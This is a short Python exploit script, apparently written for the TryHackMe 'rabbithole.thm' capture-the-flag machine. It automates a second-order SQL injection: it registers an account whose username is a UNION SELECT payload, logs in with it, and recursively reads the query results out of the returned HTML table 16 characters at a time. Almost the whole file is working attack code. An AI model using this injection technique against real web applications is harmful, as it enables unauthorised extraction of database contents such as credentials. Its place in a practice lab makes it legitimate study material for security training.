#!/usr/bin/env python3
import requests
import sys
from bs4 import BeautifulSoup
import threading
import time


# Function to send POST request (register or login)
def send_request(action, username, password):
    url = f'http://rabbithole.thm/{action}.php'
    data = {
        'username': username,
        'password': password,
        'submit' if action == 'register' else 'login': 'Submit Query'
    }
    return requests.post(url, data=data)

# Function to handle registration and login
def register_and_login(username,index=1,result=""):
    password = 'abc'
    sqli_payload = f'" UNION SELECT 2,SUBSTR(({username}), {index}, 16);#'


    # Try to register first
    register_response = send_request('register', sqli_payload, password)
    
    # Check if registration failed
    if "Something went wrong" in register_response.text:
        print("Registration failed, but proceeding with login...")

    # Proceed with login if register is successful
    login_response = send_request('login', sqli_payload, password)

    # Parse HTML response using Beautifulshop
    soup = BeautifulSoup(login_response.text, 'html.parser')

    tables = soup.find_all("table", class_="u-full-width")        
    output = tables[1].find("td").get_text()
    result += output
    if len(output) == 16:
        register_and_login(username,index + 16,result)
    else:
        print("Final extracted data:",result) 
        return


# Get the username input
username_input = input("Enter username: ")
register_and_login(username_input)



